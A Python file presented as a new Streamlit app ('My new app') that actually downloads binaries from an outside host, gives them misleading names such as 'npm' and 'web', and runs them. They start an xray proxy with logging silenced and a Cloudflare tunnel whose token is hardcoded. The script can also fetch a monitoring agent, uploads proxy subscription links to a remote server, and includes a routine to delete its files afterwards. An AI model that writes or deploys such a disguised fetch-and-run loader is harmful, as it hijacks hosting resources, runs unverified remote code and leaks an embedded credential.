import streamlit as st

st.title("🎈 My new app")

#!/usr/bin/env python3

import os
import sys
import json
import base64
import time
import re
import threading
import subprocess
import requests
import platform
import logging

# 配置日志输出到控制台
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout)
    ]
)

# Environment variables
UPLOAD_URL = os.environ.get('UPLOAD_URL', '')
PROJECT_URL = os.environ.get('PROJECT_URL', '')
AUTO_ACCESS = os.environ.get('AUTO_ACCESS', 'false').lower() == 'true'
FILE_PATH = os.environ.get('FILE_PATH', './.npm')
SUB_PATH = os.environ.get('SUB_PATH', 'sub')
UUID = os.environ.get('UUID', '28713155-6f6d-4a2d-a6cd-5d9d9f28a36e')
NEZHA_SERVER = os.environ.get('NEZHA_SERVER', '')
NEZHA_PORT = os.environ.get('NEZHA_PORT', '')
NEZHA_KEY = os.environ.get('NEZHA_KEY', '')
DOMAIN = os.environ.get('DOMAIN', 'appwrite-sydney.20241109.xyz')
GOGO_AUTH = os.environ.get('GOGO_AUTH', 'eyJhIjoiMmM0NzlmNzVkYzU2ZTlhZTA0ZjI1MWRiZjBkYzM0ODMiLCJ0IjoiN2NlZDMxNmQtY2JiMS00YWFkLWFkMTQtZGQyNTM5MTU5NmNmIiwicyI6IlpqUXhPRFl3TVRBdE16bGhZeTAwT0dRMkxUaG1OV0l0TXpBeFpXVTVaRFV4WkdJMiJ9')
GOGO_PORT = int(os.environ.get('GOGO_PORT', 8001))
CFIP = os.environ.get('CFIP', 'cf.090227.xyz')
CFPORT = int(os.environ.get('CFPORT', 443))
NAME = os.environ.get('NAME', 'Appwrite')

# Paths
os.makedirs(FILE_PATH, exist_ok=True)
logging.info(f"{FILE_PATH} is created" if not os.path.exists(FILE_PATH) else f"{FILE_PATH} already exists")

npmPath = os.path.join(FILE_PATH, 'npm')
phpPath = os.path.join(FILE_PATH, 'php')
webPath = os.path.join(FILE_PATH, 'web')
botPath = os.path.join(FILE_PATH, 'cfd')
subPath = os.path.join(FILE_PATH, 'sub.txt')
listPath = os.path.join(FILE_PATH, 'list.txt')
bootLogPath = os.path.join(FILE_PATH, 'boot.log')
configPath = os.path.join(FILE_PATH, 'config.json')

servicesInitialized = False

def deleteNodes():
    try:
        if not UPLOAD_URL:
            return
        if not os.path.exists(subPath):
            return
        with open(subPath, 'r', encoding='utf-8') as f:
            fileContent = f.read()
        decoded = base64.b64decode(fileContent).decode('utf-8')
        nodes = [line for line in decoded.split('\n') if re.match(r'(vless|vmess|trojan|hysteria2|tuic):\/\/', line)]
        if not nodes:
            return
        response = requests.post(f"{UPLOAD_URL}/api/delete-nodes", json={"nodes": nodes})
        logging.info(f"Delete nodes response: {response.status_code} - {response.text}")
    except Exception as e:
        logging.info(f"Error in deleteNodes: {e}")

def cleanupOldFiles():
    pathsToDelete = ['web', 'cfd', 'npm', 'php', 'sub.txt', 'boot.log']
    for file in pathsToDelete:
        filePath = os.path.join(FILE_PATH, file)
        if os.path.exists(filePath):
            os.unlink(filePath)
            logging.info(f"Cleaned up {filePath}")

# Generate xray config
config = {
    "log": {"access": "/dev/null", "error": "/dev/null", "loglevel": "none"},
    "inbounds": [
        {
            "port": GOGO_PORT,
            "protocol": "vless",
            "settings": {
                "clients": [{"id": UUID, "flow": "xtls-rprx-vision"}],
                "decryption": "none",
                "fallbacks": [{"dest": 3001}, {"path": "/vless-argo", "dest": 3002}, {"path": "/vmess-argo", "dest": 3003}, {"path": "/trojan-argo", "dest": 3004}]
            },
            "streamSettings": {"network": "tcp"}
        },
        {
            "port": 3001,
            "listen": "127.0.0.1",
            "protocol": "vless",
            "settings": {"clients": [{"id": UUID}], "decryption": "none"},
            "streamSettings": {"network": "tcp", "security": "none"}
        },
        {
            "port": 3002,
            "listen": "127.0.0.1",
            "protocol": "vless",
            "settings": {"clients": [{"id": UUID, "level": 0}], "decryption": "none"},
            "streamSettings": {"network": "ws", "security": "none", "wsSettings": {"path": "/vless-argo"}},
            "sniffing": {"enabled": True, "destOverride": ["http", "tls", "quic"], "metadataOnly": False}
        },
        {
            "port": 3003,
            "listen": "127.0.0.1",
            "protocol": "vmess",
            "settings": {"clients": [{"id": UUID, "alterId": 0}]},
            "streamSettings": {"network": "ws", "wsSettings": {"path": "/vmess-argo"}},
            "sniffing": {"enabled": True, "destOverride": ["http", "tls", "quic"], "metadataOnly": False}
        },
        {
            "port": 3004,
            "listen": "127.0.0.1",
            "protocol": "trojan",
            "settings": {"clients": [{"password": UUID}]},
            "streamSettings": {"network": "ws", "security": "none", "wsSettings": {"path": "/trojan-argo"}},
            "sniffing": {"enabled": True, "destOverride": ["http", "tls", "quic"], "metadataOnly": False}
        },
    ],
    "dns": {"servers": ["https+local://8.8.8.8/dns-query"]},
    "outbounds": [{"protocol": "freedom", "tag": "direct"}, {"protocol": "blackhole", "tag": "block"}]
}
with open(os.path.join(FILE_PATH, 'config.json'), 'w') as f:
    json.dump(config, f, indent=2)

def getSystemArchitecture():
    arch = platform.machine().lower()
    if 'arm' in arch or 'aarch64' in arch:
        return 'arm'
    return 'amd'

def downloadFile(fileName, fileUrl):
    file_path = os.path.join(FILE_PATH, fileName)
    resp = requests.get(fileUrl, stream=True)
    resp.raise_for_status()
    with open(file_path, 'wb') as f:
        for chunk in resp.iter_content(chunk_size=8192):
            f.write(chunk)
    logging.info(f"Download {fileName} successfully")
    return fileName

def downloadFilesAndRun():
    architecture = getSystemArchitecture()
    filesToDownload = getFilesForArchitecture(architecture)
    if not filesToDownload:
        logging.info("Can't find a file for the current architecture")
        return
    for fileInfo in filesToDownload:
        try:
            downloadFile(fileInfo['fileName'], fileInfo['fileUrl'])
        except Exception as e:
            logging.info(f"Error downloading {fileInfo['fileName']}: {e}")
            return

    # Authorize files
    def authorizeFiles(filePaths):
        for relativeFilePath in filePaths:
            absoluteFilePath = os.path.join(FILE_PATH, relativeFilePath)
            if os.path.exists(absoluteFilePath):
                os.chmod(absoluteFilePath, 0o775)
                logging.info(f"Empowerment success for {absoluteFilePath}: 775")

    filesToAuthorize = ['./npm', './web', './cfd'] if NEZHA_PORT else ['./php', './web', './cfd']
    authorizeFiles(filesToAuthorize)

    # Run cfd (cloudflared)
    cfd_path = os.path.join(FILE_PATH, 'cfd')
    if os.path.exists(cfd_path):
        if re.match(r'^[A-Z0-9a-z=]{120,250}$', GOGO_AUTH):
            args = f"tunnel --edge-ip-version auto --no-autoupdate --protocol http2 run --token {GOGO_AUTH}"
        elif 'TunnelSecret' in GOGO_AUTH:
            args = f"tunnel --edge-ip-version auto --config {os.path.join(FILE_PATH, 'tunnel.yml')} run"
        else:
            args = f"tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile {os.path.join(FILE_PATH, 'boot.log')} --loglevel info --url http://localhost:{GOGO_PORT}"
        
        # 使用subprocess.Popen替代nohup方式
        cfd_cmd = [cfd_path] + args.split()
        cfd_process = subprocess.Popen(
            cfd_cmd,
            stdout=sys.stdout,
            stderr=sys.stderr,
            text=True
        )
        logging.info(f"CFD process started with PID: {cfd_process.pid}")
        logging.info('cfd is running')
        time.sleep(2)

    # Run web (xray)
    logging.info('Starting web')
    # 使用subprocess.Popen替代nohup方式
    web_process = subprocess.Popen(
        [os.path.join(FILE_PATH, 'web'), '-c', os.path.join(FILE_PATH, 'config.json')],
        stdout=sys.stdout,
        stderr=sys.stderr,
        text=True
    )
    logging.info(f"Web process started with PID: {web_process.pid}")
    logging.info('web is running')

    time.sleep(5)

def getFilesForArchitecture(architecture):
    if architecture == 'arm':
        baseFiles = [
            {"fileName": "web", "fileUrl": "https://arm64.ssss.nyc.mn/web"},
            {"fileName": "cfd", "fileUrl": "https://arm64.ssss.nyc.mn/2go"}
        ]
    else:
        baseFiles = [
            {"fileName": "web", "fileUrl": "https://amd64.ssss.nyc.mn/web"},
            {"fileName": "cfd", "fileUrl": "https://amd64.ssss.nyc.mn/2go"}
        ]
    if NEZHA_SERVER and NEZHA_KEY:
        if NEZHA_PORT:
            npmUrl = "https://arm64.ssss.nyc.mn/agent" if architecture == 'arm' else "https://amd64.ssss.nyc.mn/agent"
            baseFiles.insert(0, {"fileName": "npm", "fileUrl": npmUrl})
        else:
            phpUrl = "https://arm64.ssss.nyc.mn/v1" if architecture == 'arm' else "https://amd64.ssss.nyc.mn/v1"
            baseFiles.insert(0, {"fileName": "php", "fileUrl": phpUrl})
    return baseFiles

def argoType():
    if not GOGO_AUTH or not DOMAIN:
        logging.info("DOMAIN or GOGO_AUTH variable is empty, use quick tunnels")
        return
    if 'TunnelSecret' in GOGO_AUTH:
        with open(os.path.join(FILE_PATH, 'tunnel.json'), 'w') as f:
            f.write(GOGO_AUTH)
        tunnel_id = GOGO_AUTH.split('"')[11]
        tunnel_yaml = f"""  tunnel: {tunnel_id}
  credentials-file: {os.path.join(FILE_PATH, 'tunnel.json')}
  protocol: http2
  
  ingress:
    - hostname: {DOMAIN}
      service: http://localhost:{GOGO_PORT}
      originRequest:
        noTLSVerify: true
    - service: http_status:404
  """
        with open(os.path.join(FILE_PATH, 'tunnel.yml'), 'w') as f:
            f.write(tunnel_yaml)
    else:
        logging.info("GOGO_AUTH mismatch TunnelSecret,use token connect to tunnel")

argoType()

def extractDomains():
    argoDomain = None
    if GOGO_AUTH and DOMAIN:
        argoDomain = DOMAIN
        logging.info('DOMAIN:', argoDomain)
        generateLinks(argoDomain)
        return
    try:
        with open(os.path.join(FILE_PATH, 'boot.log'), 'r', encoding='utf-8') as f:
            fileContent = f.read()
        lines = fileContent.split('\n')
        argoDomains = []
        for line in lines:
            match = re.search(r'https?://([^ ]*trycloudflare\.com)/?', line)
            if match:
                argoDomains.append(match.group(1))
        if argoDomains:
            argoDomain = argoDomains[0]
            logging.info('ArgoDomain:', argoDomain)
            generateLinks(argoDomain)
        else:
            logging.info('ArgoDomain not found, re-running cfd to obtain ArgoDomain')
            boot_log = os.path.join(FILE_PATH, 'boot.log')
            if os.path.exists(boot_log):
                os.unlink(boot_log)
            cmd_kill = 'pkill -f "[b]ot" > /dev/null 2>&1'
            result_kill = subprocess.run(cmd_kill, shell=True, capture_output=True, text=True)
            logging.info(f"Pkill output: stdout={result_kill.stdout}, stderr={result_kill.stderr}")
            time.sleep(3)
            args = f"tunnel --edge-ip-version auto --no-autoupdate --protocol http2 --logfile {boot_log} --loglevel info --url http://localhost:{GOGO_PORT}"
            cmd = f"nohup {os.path.join(FILE_PATH, 'cfd')} {args} &"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            logging.info(f"Re-run CFD command output: stdout={result.stdout}, stderr={result.stderr}")
            logging.info('cfd is running.')
            time.sleep(3)
            extractDomains()  # Recurse
    except Exception as error:
        logging.info(f'Error reading boot.log: {error}')

def generateLinks(argoDomain):
    global ISP
    ISP = 'Unknown'
    try:
        resp = requests.get('https://speed.cloudflare.com/meta', timeout=5, headers={
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        logging.info(f"Speed.cloudflare meta response: {resp.status_code} - {resp.text[:200]}...")  # logging.info partial response
        data = resp.json()
        if data.get('country') and data.get('asOrganization'):
            ISP = f"{data['country']}-{data['asOrganization']}".replace(' ', '_')
        else:
            ISP = data.get('country') or data.get('asOrganization') or 'CF-Node'
        logging.info(f"ISP from API: {ISP}")
    except Exception as e:
        logging.info(f"Error fetching meta via requests: {e}")
        try:
            cmd_curl = 'curl -s https://speed.cloudflare.com/meta | awk -F\\" \'{logging.info $26"-"$18}\' | sed -e \'s/ /_/g\''
            metaInfo = subprocess.check_output(cmd_curl, shell=True, timeout=5).decode('utf-8').strip()
            logging.info(f"Curl command output: {metaInfo}")
            ISP = metaInfo or 'CF-Node'
        except Exception as execErr:
            logging.info(f"Error in curl: {execErr}")
            ISP = os.environ.get('ISP_NAME', f"{NAME}-Node")
    time.sleep(2)
    VMESS = {
        "v": "2",
        "ps": f"{NAME}-{ISP}",
        "add": CFIP,
        "port": CFPORT,
        "id": UUID,
        "aid": "0",
        "scy": "none",
        "net": "ws",
        "type": "none",
        "host": argoDomain,
        "path": "/vmess-argo?ed=2560",
        "tls": "tls",
        "sni": argoDomain,
        "alpn": "",
        "fp": "chrome"
    }
    subTxt = f"""vless://{UUID}@{CFIP}:{CFPORT}?encryption=none&security=tls&sni={argoDomain}&fp=chrome&type=ws&host={argoDomain}&path=%2Fvless-argo%3Fed%3D2560#{NAME}-{ISP}
  
vmess://{base64.b64encode(json.dumps(VMESS).encode('utf-8')).decode('utf-8')}
  
trojan://{UUID}@{CFIP}:{CFPORT}?security=tls&sni={argoDomain}&fp=chrome&type=ws&host={argoDomain}&path=%2Ftrojan-argo%3Fed%3D2560#{NAME}-{ISP}
    """
    with open(subPath, 'w', encoding='utf-8') as f:
        f.write(base64.b64encode(subTxt.encode('utf-8')).decode('utf-8'))
    logging.info(f"{FILE_PATH}/sub.txt saved successfully with ISP: {ISP}")
    uplodNodes()

def uplodNodes():
    if UPLOAD_URL and PROJECT_URL:
        subscriptionUrl = f"{PROJECT_URL}/{SUB_PATH}"
        jsonData = {"subscription": [subscriptionUrl]}
        try:
            resp = requests.post(f"{UPLOAD_URL}/api/add-subscriptions", json=jsonData)
            logging.info(f"Upload subscription response: {resp.status_code} - {resp.text}")
            if resp.status_code == 200:
                logging.info('Subscription uploaded successfully')
        except Exception as error:
            logging.info(f"Upload error: {error}")
            if hasattr(error, 'response') and error.response and error.response.status_code == 400:
                logging.info("Subscription already exists")
    elif UPLOAD_URL:
        if not os.path.exists(listPath):
            return
        with open(listPath, 'r', encoding='utf-8') as f:
            content = f.read()
        nodes = [line for line in content.split('\n') if re.match(r'(vless|vmess|trojan|hysteria2|tuic):\/\/', line)]
        if not nodes:
            return
        try:
            resp = requests.post(f"{UPLOAD_URL}/api/add-nodes", json={"nodes": nodes})
            logging.info(f"Upload nodes response: {resp.status_code} - {resp.text}")
            if resp.status_code == 200:
                logging.info('Nodes uploaded successfully')
        except Exception as error:
            logging.info(f"Upload nodes error: {error}")
    else:
        logging.info('Skipping upload nodes')

def cleanFiles():
    time.sleep(90)
    filesToDelete = [bootLogPath, configPath, webPath, botPath, phpPath, npmPath]
    if NEZHA_PORT:
        filesToDelete.append(npmPath)
    elif NEZHA_SERVER and NEZHA_KEY:
        filesToDelete.append(phpPath)
    cmd = f"rm -rf {' '.join(filesToDelete)}"
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    logging.info(f"Clean files output: stdout={result.stdout}, stderr={result.stderr}")
    os.system('clear')
    logging.info('App is running')
    logging.info('Thank you for using this script, enjoy!')

def AddVisitTask():
    if not AUTO_ACCESS or not PROJECT_URL:
        logging.info("Skipping adding automatic access task")
        return
    try:
        resp = requests.post('https://oooo.serv00.net/add-url', json={"url": PROJECT_URL})
        logging.info(f"Add visit task response: {resp.status_code} - {resp.text}")
        logging.info("automatic access task added successfully")
    except Exception as error:
        logging.info(f"添加URL失败: {error}")

def main():
    logging.info("开始运行...")
    global servicesInitialized
    try:
        if not servicesInitialized:
            logging.info('初始化服务...')
            deleteNodes()
            cleanupOldFiles()
            downloadFilesAndRun()
            extractDomains()
            # AddVisitTask()
            # clean_thread = threading.Thread(target=cleanFiles, daemon=True)
            # clean_thread.start()
            servicesInitialized = True

        try:
            logging.info("读取订阅文件:")
            if os.path.exists(subPath):
                with open(subPath, 'r', encoding='utf-8') as f:
                    subContent = f.read()
                    st.write(subContent)
            else:
                st.write("订阅文件不存在")
        except Exception as err:
            (f"读取订阅文件出错: {err}")

    except Exception as err:
        logging.info(f"error: {err}")

if __name__ == "__main__":
    RED = "\033[91m"
    print(f"{RED}The Script is running...")
    main()
    sys.stdout.flush()



